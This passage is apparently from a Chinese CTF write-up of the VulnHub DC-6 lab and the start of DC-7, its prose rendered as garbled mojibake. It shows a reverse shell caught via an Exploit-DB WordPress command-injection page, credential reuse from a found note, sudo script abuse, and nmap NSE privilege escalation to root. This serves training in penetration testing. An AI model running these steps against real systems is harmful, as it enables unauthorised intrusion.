<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¼šæŠ¥é”™</p>
<p>ä¼¼ä¹ä¸èƒ½ä½¿ç”¨<code>python</code>å‘½ä»¤ï¼Œä¸€ä½¿ç”¨å°±é€€å‡º<code>shell</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010233037169.png" alt="image-20221010233037169"></p>
<p>é‚£å°±çœ‹èµ·æ¥æœ‰ç‚¹éš¾å—äº†ï¼Œå†è¯•è¯•èƒ½ä¸èƒ½è¿›å…¥ç¨³å®š<code>shell</code></p>
<blockquote>
<p>å…ˆ<br><code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code>  </p>
</blockquote>
<p>ç»“æœå¡æ­»äº†</p>
<p>ç®—äº†ç®—äº†ï¼Œå°±è¿™æ ·çœ‹å§</p>
<p>ã€æˆ‘è¿™é‡ŒæŠŠ<code>py</code>è„šæœ¬å¯¼å…¥ä¸€ä¸ªæ–°çš„æ–‡ä»¶é‡Œï¼ˆ<code>1.py</code>ï¼‰ï¼ŒæŠŠæˆ‘çš„ipï¼Œç”¨æˆ·åï¼Œå¯†ç éƒ½å†™äº†è¿›å»ï¼Œå°±ä¸ç”¨é€€å‡ºäº†åˆé‡æ–°è¾“å…¥äº†ã€‘</p>
<hr>
<p>å…ˆé€€åˆ°ä¸»ç›®å½•çœ‹çœ‹æœ‰å‡ ä¸ªç”¨æˆ·</p>
<p>ä½†æ˜¯å‘ç°å¥½åƒæœ‰ç‚¹é—®é¢˜ï¼Œä¼¼ä¹æœ‰çš„å‘½ä»¤æ‰§è¡Œå°±å’Œè„šæœ¬å†²çªï¼Œé‚£å°±ç”¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221010234544191.png" alt="image-20221010234544191"></p>
<h3><span id="245274html">2ï¼‰45274.html</span></h3><p>é‚£æˆ‘ä»¬å…ˆä¸ç®¡å®ƒï¼Œæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ªå‘½ä»¤æ³¨å…¥çš„æ²¡æœ‰ç”¨ï¼Œ</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/usr/</span>share<span class="regexp">/exploitdb/</span>exploits<span class="regexp">/php/</span>webapps/<span class="number">45274</span>.html</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011113959660.png" alt="image-20221011113959660"></p>
<p>æˆ‘ä»¬æŠŠè¿™ä¸ªæ–‡ä»¶å¯¼å…¥ä¸€ä¸ªæ–°æ–‡ä»¶ä¸­ã€1.htmlã€‘</p>
<p>ä¸»è¦æ˜¯ä¿®æ”¹è¿™é‡Œçš„ç½‘ç«™ç½‘å€å’Œç›‘å¬æœ¬åœ°<code>ip</code>ï¼Œæ”¹æˆæˆ‘ä»¬çš„<code>wordy</code>å’Œ<code>kali</code>æœºçš„<code>ip</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost:<span class="number">8000</span><span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br><span class="line"></span><br><span class="line">==&gt;</span><br><span class="line"></span><br><span class="line">http:<span class="regexp">//</span>wordy<span class="regexp">/wp-admin/</span>admin.php?page=plainview_activity_monitor&amp;tab=activity_tools</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011115438911.png" alt="image-20221011115438911"></p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nlvp <span class="number">127.0</span>.<span class="number">0.1</span>   <span class="operator">=</span><span class="operator">=</span>&gt;   nc <span class="number">192.168</span>.<span class="number">133.140</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011114105820.png" alt="image-20221011114105820"></p>
<p>ç„¶åå› ä¸ºæ˜¯<code>html</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨æµè§ˆå™¨æ‰“å¼€ï¼Œ</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011114637014.png" alt="image-20221011114637014"></p>
<p>å½“ç„¶ä¹Ÿå¯ä»¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> -m http.server <span class="number">8008</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åä»¥æµè§ˆå™¨æ–¹å¼è®¿é—®æœ¬åœ°<code>ip:8008</code>ï¼Œå†æ‰“å¼€é‡Œé¢<code>1.html</code>æ–‡ä»¶</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011114825111.png" alt="image-20221011114825111"></p>
<h4><span id="ncç›‘å¬æ‹¿shell">ncç›‘å¬æ‹¿shell</span></h4><p>ç„¶åæˆ‘ä»¬å‘ç°æœ‰ä¸ª</p>
<p><code>Submit request</code>çš„æŒ‰é’®ï¼Œçœ‹æ¥æ˜¯å‘é€è¯·æ±‚ï¼Œç„¶å<code>nc</code>åå¼¹shell</p>
<blockquote>
<p>æ³¨æ„ç›‘å¬ç«¯å£æ˜¯<code>9999</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011115108761.png" alt="image-20221011115108761"></p>
<p>ç„¶åæˆ‘ä»¬åœ¨æµè§ˆå™¨ç‚¹å‡»ä¸€ä¸‹<code>Submit request</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011122029894.png" alt="image-20221011122029894"></p>
<p>è¿æ¥åˆ° <code>shell</code></p>
<p>è¿™ä¸ªæ¯”è„šæœ¬çš„é‚£ä¸ªå°±æ›´åŠ æ–¹ä¾¿ä¸€ä¸‹äº†ï¼Œ</p>
<hr>
<p>å›ºå®šå§¿åŠ¿</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿›å…¥ç¨³å®šå¼shell</p>
<blockquote>
<p>å…ˆ<code>ctrl+z</code><br>ç„¶åæ‰§è¡Œ<br><code>stty raw -echo ; fg ; reset</code> Â </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011122301709.png" alt="image-20221011122301709"></p>
<hr>
<p>ç„¶åå¼€å§‹æ‰¾æ‰¾æœ‰æ²¡æœ‰å…¶ä»–ç”¨æˆ·çš„å¯†ç ä¿¡æ¯</p>
<p>å…ˆåˆ° <code>/home</code> é‡ŒæŸ¥çœ‹ä¸€ä¸‹ï¼Œå‘ç°äº†é™¤äº†<code>admin</code>å…¶ä»–ä¸‰ä¸ªç”¨æˆ·ç›®å½•</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011122438174.png" alt="image-20221011122438174"></p>
<p>æˆ‘ä»¬å…ˆè¿›æˆ‘ä»¬ç™»å½•æˆåŠŸçš„<code>mark</code>ç›®å½•æŸ¥çœ‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011122638708.png" alt="image-20221011122638708"></p>
<p>å‘ç°æœ‰ä¸ª<code>things-to-do.txt</code>æ–‡æœ¬æ–‡ä»¶</p>
<p>æŸ¥çœ‹å†…å®¹</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span> things-<span class="keyword">to</span>-<span class="keyword">do</span>.txt</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011122741660.png" alt="image-20221011122741660"></p>
<blockquote>
<p><code>Things to do:</code></p>
<ul>
<li><code>Restore full functionality for the hyperdrive (need to speak to Jens)</code></li>
<li><code>Buy present for Sarah&#39;s farewell party</code></li>
<li><code>Add new user: graham - GSo7isUM1D4 - done</code></li>
<li><code>Apply for the OSCP course</code></li>
<li><code>Buy new laptop for Sarah&#39;s replacement</code></li>
</ul>
<p>æ„æ€æ˜¯ï¼š</p>
<p>è¦åšçš„äº‹æƒ…ï¼š</p>
<ul>
<li>æ¢å¤è¶…å…‰é€Ÿå¼•æ“çš„å…¨éƒ¨åŠŸèƒ½ï¼ˆéœ€è¦ä¸ Jens äº¤è°ˆï¼‰</li>
<li>ä¸ºèæ‹‰çš„å‘Šåˆ«æ´¾å¯¹è´­ä¹°ç¤¼ç‰©</li>
<li>æ·»åŠ æ–°ç”¨æˆ·ï¼šgraham - GSo7isUM1D4 - å®Œæˆ</li>
<li>ç”³è¯·OSCPè¯¾ç¨‹</li>
<li>ä¸ºèæ‹‰è´­ä¹°æ–°çš„ç¬”è®°æœ¬ç”µè„‘</li>
</ul>
<p>&#x2F;&#x2F;å…³é”®ä¿¡æ¯æˆ‘ä»¬å¾—åˆ°äº†grahamç”¨æˆ·çš„å¯†ç ã€æˆ‘ä¹Ÿæƒ³è€ƒOSCPï¼Œå“­å”§å”§ã€‘</p>
</blockquote>
<p>æˆ‘ä»¬æ ¹æ®æˆ‘ä»¬æ‹¿åˆ°<code>graham</code>çš„ä¿¡æ¯ï¼Œç™»å½•<code>ssh</code></p>
<p>ã€å½“ç„¶åœ¨åŸæœ‰<code>shell</code>é‡Œåˆ©ç”¨<code>su</code>å‘½ä»¤åˆ‡æ¢ç”¨æˆ·<code>graham</code>ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œä½†æ˜¯<code>ssh</code>æœ‰é¢œè‰²ï¼Œçœ‹èµ·æ¥å¥½çœ‹ä¸€äº›ã€‘</p>
<p>ã€å› ä¸ºä¹‹å‰å°±çœ‹åˆ°è¿è¡Œç€<code>ssh</code>ï¼Œæ²¡å¿…è¦å†åœ¨ç™»å½•ä¸€æ¬¡ç½‘ç«™ï¼Œåæ­£ä¸æ˜¯æœ€é«˜æƒé™ã€‘</p>
<blockquote>
<p><code>ssh graham@192.168.133.145 -p 22</code>    &#x2F;&#x2F;é¶æœºip  sshè¿è¡Œç«¯å£<br>å¯†ç ï¼š<code>GSo7isUM1D4</code></p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011123625279.png" alt="image-20221011123625279"></p>
<p>ç„¶åæˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011124153885.png" alt="image-20221011124153885"></p>
<p>çœ‹åˆ°æ˜¯æœ‰<code>jens</code>ç›®å½•ä¸‹ä¸€ä¸ªè„šæœ¬æ–‡ä»¶çš„è¿è¡Œæƒé™ï¼Œè€Œä¸”ä¸éœ€è¦<code>jens</code>çš„å¯†ç ï¼Œå°±å¯ä»¥ä»–çš„èº«ä»½ä¸‹è¿è¡Œäº†ã€<code>mark</code>æˆ‘è¯•äº†çš„ï¼Œæ²¡æœ‰æƒé™ã€‘</p>
<h4><span id="ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬å®ç°åˆ‡æ¢ç”¨æˆ·">ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·</span></h4><p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹å†…å®¹</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011124824445.png" alt="image-20221011124824445"></p>
<p>å‘ç°æ˜¯æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œ</p>
<p>ä½†æ˜¯æˆ‘ä»¬çš„ç›®çš„æƒ³è·å¾—<code>jens</code>çš„ç™»å½•æƒé™ï¼Œæˆ‘ä»¬åœ¨è„šæœ¬æ–‡ä»¶ä¸­è¿½åŠ ä¸€äº›å‘½ä»¤</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">&quot;/bin/bash&quot;</span>  &gt;&gt; <span class="regexp">/home/</span>jens/backups.sh</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯å½“æˆ‘ä»¬ä»¥<code>jens</code>èº«ä»½è¿è¡Œè¿™ä¸ªè„šæœ¬æ—¶ï¼Œå½“æ‰§è¡Œ<code>/bin/bash</code>æ—¶ï¼Œå°±ç®—æˆ‘ä»¬ç°åœ¨æ˜¯<code>graham</code>ï¼Œä¹Ÿä¼šåˆ‡æ¢æˆ<code>jens</code>ï¼Œè¿™ä¹Ÿå¾—ç›Šäºå¯ä»¥<code>nopasswd</code>è¿è¡Œ</p>
<blockquote>
<p><code>sudo -u jens /home/jens/backups.sh</code></p>
<p>&#x2F;&#x2F;æ³¨æ„å“¦ï¼Œè¿™é‡Œæ˜¯éœ€è¦ä»¥<code>jens</code>èº«ä»½è¿è¡Œã€æ¯•ç«Ÿä»–ç»™äº†æˆ‘ä»¬ç”¨ä»–èº«ä»½æ‰§è¡Œæƒé™ã€‘æ‰å¯ä»¥å®ç°åˆ‡æ¢ç”¨æˆ·ï¼Œå¦‚æœç›´æ¥è¿è¡Œè¿˜æ˜¯<code>graham</code>ç”¨æˆ·ï¼Œå°±å¦‚ä¸‹å›¾ä¸€æ ·</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011125910796.png" alt="image-20221011125910796"></p>
<p>åˆ‡æ¢ç”¨æˆ·æˆåŠŸï¼Œ</p>
<p>æˆ‘ä»¬å…ˆçœ‹çœ‹<code>jens</code>æœ‰å“ªäº›å‘½ä»¤å¯ä»¥æ‰§è¡Œ</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011130314044.png" alt="image-20221011130314044"></p>
<p>ç»ˆäºï¼Œå‘ç°äº†<code>root</code>çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>nmap</code>å‘½ä»¤ã€åªæœ‰ç®¡ç†å‘˜å¯ä»¥ã€‘ï¼Œé‚£ä¹ˆå¦‚ä½•æ‹¿åˆ°æƒé™å‘¢</p>
<h2><span id="4nmapææƒ">4.nmapææƒ</span></h2><h3><span id="1æ—§ç‰ˆ">1.æ—§ç‰ˆ</span></h3><p>nmapï¼ˆ2.02-5.21ï¼‰å­˜åœ¨äº¤æ¢æ¨¡å¼ï¼Œå¯åˆ©ç”¨ææƒ</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure>

<p>ä¹‹åæ‰§è¡Œ:</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure>

<p>msfä¸­çš„æ¨¡å—ä¸ºï¼š</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure>

<h3><span id="2æ–°ç‰ˆ">2.æ–°ç‰ˆ</span></h3><p>è¾ƒæ–°ç‰ˆå¯ä½¿ç”¨ <code>--script</code> å‚æ•°ï¼š</p>
<blockquote>
<p>å…ˆå†™å…¥ä¸€æ¡å‘½ä»¤<br><code>echo &quot;os.execute(&#39;/bin/sh&#39;)&quot; &gt; getshell</code><br>å†â€“scriptå‚æ•°ï¼Œæ‰§è¡Œ<br><code>sudo nmap --script=getshell</code></p>
</blockquote>
<p>æŸ¥çœ‹ä¸€ä¸‹é¶æœºçš„<code>nmap</code>ç‰ˆæœ¬</p>
<p><code>7.4</code>è¿˜æ˜¯æŒºé«˜çš„</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></p>
<p>é‚£æˆ‘ä»¬å†™ä¸€ä¸ªè„šæœ¬ï¼Œé‡Œé¢åŠ ä¸Šå‘½ä»¤ï¼Œå†ç”¨æ–°ç‰ˆ<code>nmap</code>è¿è¡Œè¿™ä¸ªè„šæœ¬</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure>



<blockquote>
<p>æ³¨æ„å“ˆï¼Œ<code>jens</code>åªæœ‰åœ¨<code>~</code>ç›®å½•ä¸‹æ‰å¯ä»¥æ‰§è¡Œ<code>echo</code>å‘½ä»¤ï¼Œä¸ç„¶æ˜¯ä¸å¯ä»¥çš„</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></p>
<p>æˆåŠŸææƒï¼Œç„¶åæˆ‘ä»¬æŸ¥æ‰¾<code>flag</code>ã€æ²¡è¾“å…¥å›æ˜¾æœ‰ç‚¹å°éš¾å—ï¼Œä½†æ˜¯ä¸å½±å“æ‹¿<code>flag</code>ã€‘</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></p>
<blockquote>
<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br></pre></td></tr></table></figure>

<p><code>Congratulations!!!</code></p>
<p><code>Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</code><br><code>who have provided feedback, and who have taken time to complete these little</code><br><code>challenges.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œï¼ï¼ï¼</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-6ã€‚åªæ˜¯æƒ³å‘æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>è°æä¾›äº†åé¦ˆï¼Œè°èŠ±æ—¶é—´å®Œæˆäº†è¿™äº›å°äº‹<br>æŒ‘æˆ˜ã€‚</p>
<p>å¦‚æœä½ å–œæ¬¢è¿™ä¸ª CTFï¼Œè¯·é€šè¿‡@DCAU7 ç»™æˆ‘å‘ä¸€æ¡æ¨æ–‡ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<hr>
<h1><span id="ä¸ƒ-dc-7ä¸­çº§">ä¸ƒã€DC-7[ä¸­çº§]</span></h1><p><strong>only one flag</strong></p>
<blockquote>
<p><code>hintï¼š</code><br><code>While it&#39;s kind of a logical progression from an earlier DC release (I won&#39;t tell you which one), there are some new concepts involved, but you will need to figure those out for yourself. :-) If you need to resort to brute forcing or dictionary attacks, you probably won&#39;t succeed.</code></p>
<p><code>What you will need to do, is to think &quot;outside&quot; of the box.</code></p>
<p><code>Waaaaaay &quot;outside&quot; of the box. :-)</code></p>
<p>è™½ç„¶è¿™æ˜¯è¾ƒæ—©çš„ DC ç‰ˆæœ¬çš„ä¸€ç§åˆä¹é€»è¾‘çš„è¿›å±•ï¼ˆæˆ‘ä¸ä¼šå‘Šè¯‰ä½ æ˜¯å“ªä¸€ä¸ªï¼‰ï¼Œä½†å…¶ä¸­æ¶‰åŠåˆ°ä¸€äº›æ–°æ¦‚å¿µï¼Œä½†ä½ éœ€è¦è‡ªå·±å¼„æ¸…æ¥šè¿™äº›ã€‚:-) å¦‚æœæ‚¨éœ€è¦ä½¿ç”¨æš´åŠ›ç ´è§£æˆ–å­—å…¸æ”»å‡»ï¼Œæ‚¨å¯èƒ½ä¸ä¼šæˆåŠŸã€‚</p>
<p>æ‚¨éœ€è¦åšçš„æ˜¯è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚</p>
<p>Waaaaaayâ€œåœ¨ç›’å­å¤–é¢â€ã€‚:-)</p>
</blockquote>
<h2><span id="ä¿¡æ¯æ”¶é›†">ä¿¡æ¯æ”¶é›†</span></h2><p><code>nmap</code>æ‰«ææŸ¥çœ‹å¼€æ”¾ç«¯å£</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018195918528.png" alt="image-20221018195918528"></p>
<p>å‘ç°è¿è¡Œç€<code>22</code>å’Œ<code>80</code>ç«¯å£ï¼Œ<code>22</code>ç«¯å£è¿è¡Œç€<code>ssh</code></p>
<p>å…ˆçœ‹çœ‹æ¡†æ¶å’Œè¯­è¨€</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018194429569.png" alt="image-20221018194429569"></p>
<p><code>CMS</code>æ˜¯<code>Drupal 8</code>ï¼Œçœ‹æ¥è¿™æ˜¯å…³é”®ã€å¥½å®¶ä¼™ï¼Œ<code>DC1</code>é‡ç°ã€‘</p>
<p>å†é¡ºæ‰‹æ‰«ä¸€ä¸‹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018194353195.png" alt="image-20221018194353195"></p>
<p>çœ‹åˆ°æœ‰ä¸€ä¸ªç™»å½•çª—å£é¡µé¢</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018194531613.png" alt="image-20221018194531613"></p>
<p>é‚£æˆ‘ä»¬å°±å…ˆæƒ³åŠæ³•æ€ä¹ˆè·å¾—ä¸€ä¸ªç”¨æˆ·çš„è´¦å·å¯†ç </p>
<hr>
<h2><span id="1è·³å‡ºæ¡†æ¶">1.è·³å‡ºæ¡†æ¶</span></h2><blockquote>
<p>è¿™é‡Œæˆ‘å¼€å§‹ä»¥ä¸ºæ˜¯æ€ç»´çš„æ¡†æ¶ï¼Œç»“æœæ˜¯é¶æœºçš„æ¡†æ¶ï¼Œæˆ‘ä»¬éœ€è¦ç”¨æœç´ å·¥å…·ï¼Œå¾—åˆ°æˆ‘ä»¬çš„ä¿¡æ¯ï¼Œè€Œä¸æ˜¯æ­»è„‘ç­‹åœ¨é¶æœºä¸Šè‹¦è‹¦æ‰¾æ¼æ´æˆ–è€…è›®ç”¨çˆ†ç ´</p>
<p>åœ¨å®é™…çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œåœ¨ç½‘ç«™ä¹‹å¤–è·å¾—ç½‘ç«™çš„ä¿¡æ¯ï¼Œè¿™ä¹Ÿæ˜¯æ”¶é›†ä¿¡æ¯çš„ä¸€ä¸ªé‡è¦çš„åŠæ³•</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2022/08/29/vulnhub/image-20221018200526154.png" alt="image-20221018200526154"></p>
<p>åœ¨ç½‘ç«™çš„æœ€åº•ä¸‹æˆ‘ä»¬å‘ç°äº†</p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@DC</span>7USER</span><br></pre></td></tr></table></figure>

<p>è¿™åº”è¯¥æ˜¯ç½‘ç«™çš„æ­å»ºè€…ï¼Œå¯¹äºåƒè¿™ç§å°ç½‘ç«™ï¼Œä¸€èˆ¬å¯èƒ½æ˜¯åœ¨ä¸€äº›å¹³å°ï¼Œæ¯”å¦‚<code>github</code>ä¸Šæ­å»ºã€æŒ‚è½½çš„ã€æ¯”å¦‚æˆ‘çš„åšå®¢ã€‘ï¼Œæ‰€ä»¥åœ¨è¿™äº›å¹³å°ä¸Šï¼Œæˆ‘ä»¬å¾ˆæœ‰å¯èƒ½å¾—åˆ°ä¸€äº›æˆ‘ä»¬æƒ³è¦çš„æ•æ„Ÿä¿¡æ¯å’Œæ–‡ä»¶</p>
